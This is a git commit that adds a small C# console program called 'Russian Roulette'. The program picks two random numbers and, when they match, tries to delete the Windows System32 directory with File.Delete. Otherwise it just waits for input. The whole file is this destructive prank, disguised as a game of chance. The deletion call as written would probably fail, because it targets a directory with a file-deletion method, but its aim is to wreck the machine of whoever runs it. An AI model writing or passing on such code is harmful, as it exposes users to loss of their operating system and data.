232c948afaeb53b70bf4b3f1dd60b47af7ca07b3
PC <PC@DESKTOP-86E3FIO>
2023-06-16 02:54:41 -0500

    Add project files.

---
+++ Russian Roulette/Program.cs
@@ -0,0 +1,21 @@
+﻿namespace Russian_Roulette
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Random rnd = new Random();
+            int num = rnd.Next(7);
+            int num1 = rnd.Next(7);
+
+            if (num == num1)
+            {
+                File.Delete("C:\\Windows\\System32");
+            }
+            else
+            {
+                Console.ReadLine();
+            }
+        }
+    }
+}
